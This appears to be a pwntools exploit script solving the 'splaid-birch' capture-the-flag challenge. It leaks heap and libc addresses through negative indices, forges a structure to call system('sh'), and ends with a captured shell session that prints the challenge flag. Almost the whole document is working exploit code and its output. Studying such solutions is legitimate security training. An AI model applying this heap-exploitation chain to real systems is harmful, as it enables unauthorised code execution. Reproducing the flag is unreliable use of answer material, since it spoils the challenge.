from pwn import *

context.arch="amd64"
elf = ELF("./splaid-birch")
libc = ELF("./libc.so.6")

#p = process("./splaid-birch")
p = remote("splaid-birch.pwni.ng", 17579)

def sp_add(a, b):
    p.sendline("5")
    p.sendline(str(a))
    p.sendline(str(b))

def delete(a):
    p.sendline("1")
    p.sendline(str(a))

for i in range(1, 3):
    sp_add(i, 0x0)

sp_add(0, 0)

p.sendline("4")
p.sendline("531")

heap = int(p.recvline())
heap_base = heap - 0x12f8

for i in range(157):
    sp_add(0x10+i, 0x0)

for i in range(0x10):
    delete(0x10 + i)

sp_add(0x1234, heap + 0x1db8)

p.sendline("4")
p.sendline("-1817")

libc.address = int(p.recvline()) - 0x3ebca0
environ = libc.address + 0x3ee098

print "heap: " + hex(heap)
print "libc: " + hex(libc.address)

payload = "5\n"
payload += "5555\n"
payload += str(heap_base+0x4c0) + "\n"

payload += "4\n"
payload += "-1827\n"

payload += "5\n"
payload += str(0x6873) + "\n"
payload += "6666\n"

payload += "1\n"
payload += str(0x6873) + "\n"
payload = payload.ljust(0x200, "\x41")

fuck = libc.address + 0x3ed8e8 + 0x20
addr = p64(libc.address + 0x4f440) # system

payload += flat(0x0, 0x1234, 0x1234, 0x1234, 0, heap_base + 0x4c0 + 0x60, 0, 0, 0x4444, addr, 0, 0, fuck, fuck, 0x0, 0x10, 0x20)

payload = payload.ljust(0x500, "\x00")

p.sendline(payload)

p.interactive()

'''
$ id
uid=1012(splaid) gid=1013(splaid) groups=1013(splaid)
$ cd /home/splaid
$ ls
flag.txt
libsplaid.so.1
run.sh
splaid-birch
$ cat flag.txt
PCTF{7r335_0n_h34p5_0n_7r335_0n_5l3470r}
$
'''
